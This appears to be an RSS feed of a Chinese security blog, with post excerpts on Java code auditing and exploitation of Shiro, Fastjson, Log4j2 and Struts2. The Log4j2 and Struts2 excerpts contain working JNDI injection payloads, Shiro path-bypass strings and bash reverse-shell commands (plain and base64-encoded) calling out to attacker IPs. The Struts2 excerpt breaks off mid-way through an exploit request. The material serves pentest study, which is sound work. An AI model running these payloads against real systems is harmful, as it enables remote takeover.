<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Java安全 on 养猪日记</title>
    <link>http://localhost:1313/categories/java%E5%AE%89%E5%85%A8/</link>
    <description>Recent content in Java安全 on 养猪日记</description>
    <image>
      <title>养猪日记</title>
      <url>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>http://localhost:1313/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- 0.135.0</generator>
    <language>en</language>
    <lastBuildDate>Thu, 19 Dec 2024 14:25:59 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/categories/java%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>代码审计总结</title>
      <link>http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</link>
      <pubDate>Thu, 19 Dec 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%80%BB%E7%BB%93/</guid>
      <description>&lt;h1 id=&#34;前言&#34;&gt;前言&lt;/h1&gt;
&lt;p&gt;Java安全是一个比较庞大的东西，单论Java代码审计所需要的知识点其实较为简单，Java安全研究会比较深入，其实可以这两者可以较为明显的区分开来，一个为了业务服务，一个为了深入挖掘。单论安全服务以及渗透测试的程度，业务层面的Java代码审计足以。如果是要深入研究的话，愚见认为，不同的岗位决定对知识的掌握深度，当前岗位如果有深入需求再考虑。以下文章内容仅从快速完成代码审计的视角出发，不涉及深入的漏洞研究。&lt;/p&gt;
&lt;h1 id=&#34;常见组件漏洞&#34;&gt;常见组件漏洞&lt;/h1&gt;
&lt;h2 id=&#34;1shiro&#34;&gt;1、Shiro&lt;/h2&gt;
&lt;p&gt;shiro的漏洞主要是两个，一个是硬编码，一个是权限绕过：&lt;/p&gt;
&lt;h3 id=&#34;硬编码&#34;&gt;硬编码：&lt;/h3&gt;
&lt;p&gt;硬编码漏洞大家都知道问题出在rememberMe功能上，对于shiro而言，配置rememberMe的方法大致如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;securityManager.setRememberMeManager(rememberMeManager());//设置rememberMeManager()

关键词：setRememberMeManager

具体实现：
public CookieRememberMeManager rememberMeManager()  
{  
    CookieRememberMeManager cookieRememberMeManager = new CookieRememberMeManager();  
    cookieRememberMeManager.setCookie(rememberMeCookie());  
    cookieRememberMeManager.setCipherKey(Base64.decode(&amp;#34;fCq+/xW488hMTCD+cmJ3aQ==&amp;#34;));  
    return cookieRememberMeManager;  
}

搜索密钥关键词：setCipherKey

shiro还可以通过配置文件的方式进行配置，同样可以搜索关键词：
org.apache.shiro.web.mgt.DefaultWebSecurityManager
org.apache.shiro.web.mgt.CookieRememberMeManager
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;案例：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212625.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212644.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212700.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/dmsj_img/Pasted%20image%2020241210212952.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;h3 id=&#34;权限绕过&#34;&gt;权限绕过：&lt;/h3&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;CVE&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;描述&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;影响范围&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;payload&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-1957&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;权限绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.5.2&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/xxx/..;/admin/&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-11989&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-1957补丁绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.5.3&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/;/admin/page&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-13933&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-11989补丁绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.6.0&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/admin/%3bpage&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;CVE-2020-17523&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;权限绕过&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Shiro &amp;lt; 1.7.1&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/admin/%20  &lt;!-- raw HTML omitted --&gt;/admin/%2e&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;shiro配置路径匿名访问的方法大概如下：&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;1、集中配置&lt;/p&gt;</description>
    </item>
    <item>
      <title>Fastjson</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/fastjson/</guid>
      <description>&lt;h1 id=&#34;一fastjson介绍&#34;&gt;一、FastJson介绍&lt;/h1&gt;
&lt;p&gt;Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object 之间互相转换，不需要添加额外的依赖，能够直接跑在JDK上，FastJson采用独创的算法，将序列化的速度提升到极致，深受用户喜爱。产品主要提供两个接口 JSON.toJSONString 和 JSON.parseObject/JSON.parse 来分别实现序列化和反序列化操作。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;fastjson的漏洞涉及几个重要概念，深入理解一些概念后才能理解为什么会出现这种情况，以及一些面试官为什么会问一些奇怪的问题，比如fastjson不出网利用、如何判断版本等；&lt;/p&gt;
&lt;h2 id=&#34;21-jndi注入的前置知识&#34;&gt;2.1 JNDI注入的前置知识&lt;/h2&gt;
&lt;h3 id=&#34;211-java-bean&#34;&gt;2.1.1 Java Bean&lt;/h3&gt;
&lt;p&gt;一类满足标准写法的类，满足以下条件的Java类可以称之为Java Bean。&lt;/p&gt;
&lt;p&gt;1、成员变量均使用private关键字进行修饰&lt;/p&gt;
&lt;p&gt;2、提供构造方法(有参/无参)&lt;/p&gt;
&lt;p&gt;3、为每个成员变量提供set/get方法&lt;/p&gt;
&lt;h3 id=&#34;212-反射&#34;&gt;2.1.2 反射&lt;/h3&gt;
&lt;p&gt;一种可以调用任意类任意方法的类；&lt;/p&gt;
&lt;h3 id=&#34;213-序列化和反序列化&#34;&gt;2.1.3 序列化和反序列化&lt;/h3&gt;
&lt;p&gt;远程数据传输，不安全的反序列化可以造成RCE；&lt;/p&gt;
&lt;h3 id=&#34;214-jndi&#34;&gt;2.1.4 JNDI&lt;/h3&gt;
&lt;p&gt;Java名称与目录服务接口，可以理解为一个强大的通讯录，可以定位用户、网络、对象、机器等等资源&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCE0cc7bd9389f51609d1ea7294c65b0e20image.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;在实战利用中，常见的服务为LDAP、DNS、RMI，具体的代码实现效果为，如果lookup可控就可以导致JNDI注入&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;InitialContext context = new InitialContext();
context.lookup(&amp;#34;rmi://localhost:1099/HelloService&amp;#34;);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;具体流程如下：&lt;/p&gt;
&lt;p&gt;1、目标代码中调用了InitialContext.lookup(URI)，且URI为用户可控； &lt;/p&gt;
&lt;p&gt;2、攻击者控制URI参数为恶意的RMI服务地址，如：rmi://hacker_rmi_server//name； &lt;/p&gt;
&lt;p&gt;3、攻击者RMI服务器向目标返回一个Reference对象，Reference对象中指定某个精心构造的Factory类； &lt;/p&gt;
&lt;p&gt;4、目标在进行lookup()操作时，会动态加载并实例化Factory类，接着调用factory.getObjectInstance()获取外部远程对象实例； &lt;/p&gt;
&lt;p&gt;5、攻击者可以在Factory类文件的构造方法、静态代码块、getObjectInstance()方法等处写入恶意代码，达到RCE的效果；&lt;/p&gt;
&lt;p&gt;另外一种解释：&lt;/p&gt;
&lt;p&gt;JNDI支持将一个名称映射到一个Java对象,可以通过JNDI中的lookup函数向特定的提供命名服务的服务器发起查询请求获取具体对象。lookup函数可以向远程的提供目录服务的服务器发起请求查询指定对象，如果返回的是Reference类型的对象，JNDI会解析该对象的classFactory、classFactoryLocation属性。classFactory通常代表类名，classFaxtoryLocation通常代表其存储地址，JVM首先会尝试在本地寻找该类，如果本地不存在则会从classFactoryLocation(通常是一个http服务器的地址,位于远程)中进行加载，此时会触发 URLClassLoader类远程加载器，会从classFactoryLocation地址中获取远程的class文件并将其加载到JVM中。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;一些版本注入的问题：&lt;/strong&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;RMI攻击主要分3种目标：RMI Client、RMI Server、RMI Registry。
使用远程Reference字节码进行攻击。（最初始的方式，没有任何拦截）
从jdk8u121开始，RMI加入了反序列化白名单机制，JRMP的payload登上舞台，这里的
payload指的是ysoserial修改后的JRMPClient。（黑名单拦截一些类的截断）
从jdk8u121开始，RMI远程Reference代码默认不信任，RMI远程Reference代码攻击
方式开始失效。（直接不信任rmi）
从jdk8u191开始，LDAP远程Reference代码默认不信任，LDAP远程Reference代码攻
击方式开始失效，需要通过javaSerializedData返回序列化gadget方式实现攻击。
（直接不信任ldap，这以后基本都是基于本地的gadget去做复现了））
RMI服务端执行bind，我们就可以攻击RMI Registry注册中心，导致其反序列化RCE。
RMI客户端使用lookup方法理论上可以主动攻击RMI Registry
RMI Registry在RMI客户端使用lookup方法的时候，可以实现被动攻击RMI客户端
来看一下这个路程
（1）先开始什么都没有处理，rmi开启的端口可以直接发送数据过去被反序列化
（2）发现不对劲，所以java增加了黑名单机制（细节这里没讲），所以开始利用
jrmp的payload（其实就是绕过了黑名单能发送数据的类）
（3）后续rmi被不信任以后，研究人员发现了ldap也可以远程加载目录，ldap登上了
舞台
（4）ldap也被不信任，相当于无法远程加载，目前给的方法就是直接打过去让本
地存在的链子命令执行，不需要像外部做加载。
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;高版本注入的解决办法：&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Log4j2</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/log4j2/</guid>
      <description>&lt;h1 id=&#34;一log4j2&#34;&gt;一、Log4j2&lt;/h1&gt;
&lt;p&gt;Log4j是Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。&lt;/p&gt;
&lt;p&gt;​ Log4j在工程中可以易用，方便等代替了 System.out 等打印语句，它是Java下最流行的日志输入工具，一些著名的开源项目，像spring、hibernate、struts都使用该工具作为日志输入工具，可以帮助调试（有时候debug是发挥不了作用的）和分析。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;由于log4j2库中的JNDI查询功能存在反序列化漏洞，具体来说是由于log4j2在处理日志事件时，使用了java反序列化机制(java Serialization)对java的对象和反序列化操作,没有对反序列化中的过程做安全的验证措施
导致可以构造恶意的JNDI名称的特殊日志来触发log4j2库中的JndiLookup.deserialized()方法调用，在执行反序操作时，可以利用java反序列漏洞，将恶意的代码注入到反序列化对象中，从而实现远程命令攻击。&lt;/p&gt;
&lt;p&gt;来看一下正常使用的代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
 
public class Log4j2Test {
    private static  final Logger logger = LogManager.getLogger();
    public static void main(String[] args) {
        String username = &amp;#34;world&amp;#34;;
        logger.error(&amp;#34;hello {}&amp;#34;,username);
    }
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;正常这里会传入log4j2，hello word，如果我们传入${java:version}则会记录java版本， 大致的调用链如下：&lt;/p&gt;
&lt;p&gt;MessagePatternConverter.format()会对&lt;code&gt;${&lt;/code&gt;进行检测识别，并调用StrSubstitutor.replace()对传入的值进行处理StrSubstitutor类中多个方法处理到StrSubstitutor.substitute()将${jndi:rmi://192.168.198.134:9999/exp}处理解析为jndi:rmi://192.168.198.134:9999/exp后并调用resolveVariable()
StrSubstitutor.resolveVariable()调用lookup方法
判断识别jndi的处理类JndiLookup
JndiLookup.lookup()调用JndiManager.getDefaultManager()获得context
并通过JndiManager.lookup()调用java自身的InitialContext.lookup()，InitialContext类是执行命名操作的初始上下文，所有命名操作都相对于某一上下文，该初始上下文实现 Context 接口并提供解析名称的起始点，通过lookup()检索&lt;/p&gt;
&lt;p&gt;到最后一步，如果看不明白可以详细查看JNDI注入的相关内容。&lt;/p&gt;
&lt;h1 id=&#34;三漏洞发现&#34;&gt;三、漏洞发现&lt;/h1&gt;
&lt;p&gt;由于日志框架，只能哪里有空哪里插，目前依赖于插件以及xray等工具进行检测&lt;/p&gt;
&lt;p&gt;影响范围：Apache Log4j 2.x&amp;lt;=2.14.1&lt;/p&gt;
&lt;h1 id=&#34;四漏洞利用&#34;&gt;四、漏洞利用&lt;/h1&gt;
&lt;p&gt;开启log4j2的JNDI注入工具：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.2.40
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;值得注意的是，此处的IP不能为回环地址，而必须为使用的IP地址&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCEf4a59216cb0105b4103e10fc35a7697b%e6%88%aa%e5%9b%be.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;发送恶意payload:&lt;/p&gt;
&lt;p&gt;基础payload:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://dadad.ceye.io}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反弹shell：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;${jndi:ldap://10.10.14.147:1389/Basic/ReverseShell/10.10.14.147/8888}  实战中有失败案例
${jndi:ldap://10.10.14.147:1389/ldap://10.10.14.147:1389/Basic/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNDcvODg4OCAwPiYx}  使用较多
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;另外一个工具的使用方式：&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>shiro</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/shiro/</guid>
      <description>&lt;h1 id=&#34;一shiro&#34;&gt;一、shiro&lt;/h1&gt;
&lt;p&gt;Apache Shiro是用来做认证和授权的框架，执行身份验证、授权、密码和会话管理。&lt;/p&gt;
&lt;p&gt;Shiro主要配合一些容器的使用，如Tomcat、Weblogic等；同时有些框架也会将Shiro集成用来做身份认证和授权，比如：SpringBoot等；&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;h3 id=&#34;cve-2016-4437shiro-550&#34;&gt;CVE-2016-4437/Shiro-550&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt; 1.2.5&lt;/p&gt;
&lt;p&gt;第1个注意的事项：要在response中返回含有remenberMe的字段对应的请求中去构造poc&lt;/p&gt;
&lt;p&gt;第2个注意的事项 ：获取cookies的请求包resquest的必须是登录提交的http请求&lt;/p&gt;
&lt;p&gt;（1）shiro在登录处提供了Remember Me这个功能，来记录用户登录的凭证，然后shiro会对用户传入的cookie进行解密并进行反序列化，服务端接收rememberMe的cookie值后的操作是：&lt;/p&gt;
&lt;p&gt;Cookie中rememberMe字段内容&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;    ---&amp;gt; Base64解码       		      


                     ---&amp;gt; 使用密钥进行AES-CBC解密            			 


                                                ---&amp;gt; 反序列化
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;（2）由于该版本AES加密的密钥Key被硬编码在代码里（漏洞能够被利用的本质），且大部分项目未修改默认AES密钥，这意味着攻击者只要通过源代码找到AES加密的密钥，就可以构造一个恶意对象，对其进行序列化，AES加密，Base64编码，然后将其作为cookie的Remember Me字段值发送，Shiro将数据进行解密并且反序列化，最终触发反序列化漏洞。&lt;/p&gt;
&lt;p&gt;官方针对这个漏洞的修复方式将使用默认硬编码的Key改为生成随机的Key加密。&lt;/p&gt;
&lt;p&gt;密钥保存位置：&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/zj_img/WEBRESOURCEe42a394535820c01dae3f4e45464ea1dimage.png&#34; alt=&#34;&#34;  /&gt;
&lt;/p&gt;
&lt;p&gt;最后的触发位置是标准的readobject()，所以利用链基本上就是CC链或者其他依赖链了。&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-12422shiro-721&#34;&gt;CVE-2019-12422/Shiro-721&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt; 1.4.2&lt;/p&gt;
&lt;p&gt;在Apache Shiro 中用户进行登录的时候, 提供RemenberMe功能处理cookie，使用的是AES-128-CBC加密，可以通过Padding Oracle加密生成的攻击代码来重新构造一个恶意的rememberMe字段，可进行反序列化攻击。&lt;/p&gt;
&lt;p&gt;跟Shiro无关，而是对Shiro采用的加密方式进行的攻击，所以略过，只要了解了Padding Oracle Attack 原理就能理解这个攻击的原理，这里推荐Padding Oracle Attack(填充提示攻击)详解及验证。&lt;/p&gt;
&lt;p&gt;简单来说，Padding Oracle Attack是根据CBC字节翻转攻击、Padding规则以及服务端解密后返回的不同状态来穷举中间值进而获取明文的攻击。解密出的明文填充的正确与否可通过服务端的响应进行区分。通过不断调整发送的密文分组，然后根据服务端的结果进行爆破测试，可推测出确定的解密值。当应用程序接受到加密后的值以后，可能有以下三种返回：&lt;/p&gt;
&lt;p&gt;1、接受到正确的密文之后（填充正确且包含正确的值），应用程序正常返回：200 OK。&lt;/p&gt;
&lt;p&gt;2、接受到合法的密文（填充正确，但解密后得到一个不正确的值），应用程序显示自定义错误消息：200 OK。&lt;/p&gt;
&lt;p&gt;3、接受到非法的密文之后（解密后发现填充不正确），应用程序抛出一个解密异常：500 Internal Server Error。&lt;/p&gt;
&lt;p&gt;我们不需要要求解密后必须是正确的值，只要返回200 ok即可。&lt;/p&gt;
&lt;p&gt;aes gcm加密方式不一样的&lt;/p&gt;
&lt;h3 id=&#34;cve-2020-1957认证绕过漏洞&#34;&gt;CVE-2020-1957/认证绕过漏洞&lt;/h3&gt;
&lt;p&gt;Shiro &amp;lt;  1.5.2&lt;/p&gt;
&lt;p&gt;spring Boot中使用Apache Shiro进行身份验证、权限控制时，可以精心构造恶意的URL，利用Apache Shiro和Spring Boot对URL的处理的差异化，可以绕过Apache Shiro对Spring Boot中的Servlet的权限控制，越权并实现未授权访问。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Spring</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/spring/</guid>
      <description>&lt;h1 id=&#34;一spring生态&#34;&gt;一、Spring生态&lt;/h1&gt;
&lt;p&gt;Spring开源框架由Rod Johnson创建，从简单性、可测试性和松耦合的角度而言， 任何Java应用都可以从Spring中受益。 时至今日Spring已不再是一个简单的编程框架了，在整个Spring生态中包含了许多 应用在特定场景的具体框架，如：“Spring Framework”，“Spring Security”，“Spring Boot”，“Spring Cloud”等等，其中“Spring Framework”框架是 整个生态的核心基础，每个框架都有自己独立的代码仓库。&lt;/p&gt;
&lt;p&gt;Spring生态系统提供许多有用的编程框架或工具集。 当下最为流行的Spring项目： Spring Framework，Spring Security，Spring Boot，Spring Cloud等。&lt;/p&gt;
&lt;h2 id=&#34;spring-framework&#34;&gt;Spring Framework&lt;/h2&gt;
&lt;p&gt;Spring Framework项目是整个Spring生态的基础，Spring Framework项目又包含多个子模块，如：spring-core，spring-beans，spring-context，spring-aop，spring web，spring-webmvc等等。&lt;/p&gt;
&lt;h2 id=&#34;spring-boot&#34;&gt;Spring Boot&lt;/h2&gt;
&lt;p&gt;Spring Boot是一个开发基于Spring Framework的项目，它默认集成了嵌入式 Tomcat，配置注解化，支持快速集成第三方开发组件（如MyBatis），大大降低了使用 Spring的门槛，而且内置了许多可以直接用于生产环境的功能，是目前用于开发微服务架构项目的不二选择。&lt;/p&gt;
&lt;h2 id=&#34;spring-cloud&#34;&gt;Spring Cloud&lt;/h2&gt;
&lt;p&gt;Spring Cloud为开发基于微服务架构的软件系统提供了一整套工具集合，其中包含了开发各个微服务组件的具体项目，如：Spring Cloud Config（配置中心），Spring Cloud Netflix（服务注册中心），Spring Cloud Sleuth（服务调用监控），Spring Cloud Gateway（服务网关）等等。 Spring Cloud的基础是Spring Boot，基于Spring Boot可以大大简化开发各微服务组件 的流程。&lt;/p&gt;
&lt;h2 id=&#34;spring-security&#34;&gt;Spring Security&lt;/h2&gt;
&lt;p&gt;Spring Security是用于实现认证和授权，以及访问控制的安全框架，在Java生态与之提 供类似的功能还有一个框架：Apache Shiro。 Spring Security依赖于Spring Framework，也就是说如果要使用Spring Security，那 么应用架构也必须是基于Spring Framework的，这大大限制了Spring Security的使用场景；反之，Shiro就没有这样限制，而且从项目架构上Shiro更加简洁。当然，Spring Security提供了非常丰富的安全控制的功能，在某些方面甚至比Shiro更加完善，与之对 应的是掌握的Spring Security的复杂度比较大。因此，对于在应用中是否选择Spring Security需要根据实际需求来决定。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;Spring于2002年最早提出并随后创建，2009年9月Spring 3.0 RC1发布后，Spring就引入了SpEL (Spring Expression Language)。SpEL(Spring Expression Language)是基于spring的一个表达式语言，类似于struts的OGNL，能够在运行时动态执行一些运算甚至一些指令，类似于Java的反射功能。&lt;/p&gt;</description>
    </item>
    <item>
      <title>Struts2</title>
      <link>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</link>
      <pubDate>Fri, 11 Oct 2024 14:25:59 +0800</pubDate>
      <guid>http://localhost:1313/posts/java/java%E9%AB%98%E9%A2%91%E7%BB%84%E4%BB%B6%E6%BC%8F%E6%B4%9E/struts2/</guid>
      <description>&lt;h1 id=&#34;一struts2&#34;&gt;一、Struts2&lt;/h1&gt;
&lt;p&gt;Struts2框架是一个用于开发Java EE网络应用程序的开放源代码网页应用程序架构。它利用并延伸了Java Servlet API，鼓励开发者采用MVC架构。Struts2以WebWork优秀的设计思想为核心，吸收了Struts框架的部分优点，提供了一个更加整洁的MVC设计模式实现的Web应用程序框架。&lt;/p&gt;
&lt;h1 id=&#34;二漏洞原理&#34;&gt;二、漏洞原理&lt;/h1&gt;
&lt;p&gt;Struts2设计了一套OGNL的模式来操作数据。OGNL（Object Graph Navigation Language）即对象图形导航语言，通过某种表达式语法，存取Java对象树中的任意属性、调用Java对象树的方法、同时能够自动实现必要的类型转化,是语义字符串与Java对象之间沟通的桥梁。OGNL支持对象方法调用，支持类静态的方法调用和值访问，在java中的格式：&lt;/p&gt;
&lt;p&gt;@[类全名]@[方法名|值名]&lt;/p&gt;
&lt;p&gt;@java.lang.String@format(&amp;lsquo;foo %s&amp;rsquo;, &amp;lsquo;bar&amp;rsquo;)| APP_NAME；&lt;/p&gt;
&lt;p&gt;Struts2的漏洞数量众多，其本质都是一样的(除了S2-052以外)，都是Struts2框架执行了恶意用户传进来的OGNL表达式，可以造成“命令执行、服务器文件操作、打印回显、获取系统属性、危险代码执行”等，只不过需要精心构造不同的OGNL代码而已。&lt;/p&gt;
&lt;p&gt;S2-052漏洞&lt;/p&gt;
&lt;p&gt;这个漏洞也算是轰动一时，其实，跟注入OGNL表达式，达到远程代码执行的方式还不大一样，S2-052漏洞是一种XML反序列化漏洞。漏洞本质是Struts2 REST插件的XStream组件存在反序列化漏洞，当使用XStream组件对XML格式的数据包进行反序列化操作时，没有对数据内容进行有效验证，存在反序列化后远程代码执行安全隐患。&lt;/p&gt;
&lt;p&gt;同时struts2的漏洞时间也很长，S2-001发现时间为2007年，而较近的S2-061时间为2020年，跨度很大。&lt;/p&gt;
&lt;h1 id=&#34;三漏洞特征&#34;&gt;三、漏洞特征&lt;/h1&gt;
&lt;p&gt;.action   .do的请求路径&lt;/p&gt;
&lt;h1 id=&#34;四漏洞利用&#34;&gt;四、漏洞利用&lt;/h1&gt;
&lt;p&gt;S2-057 以下直接梭哈：Struts2_工具v18.09&lt;/p&gt;
&lt;p&gt;S2-061  S2-062&lt;/p&gt;
&lt;p&gt;编写反弹shell代码&lt;/p&gt;
&lt;p&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.52.130/3333 0&amp;gt;&amp;amp;1&lt;/p&gt;
&lt;p&gt;反弹shell涉及到管道符问题要将命令进行base64编码&lt;/p&gt;
&lt;p&gt;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjUyLjEzMC8zMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;POST /index.action HTTP/1.1
Host: localhost:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Length: 829

------WebKitFormBoundaryl7d1B1aGsV2wcZwF
Content-Disposition: form-data; name=&amp;#34;id&amp;#34;

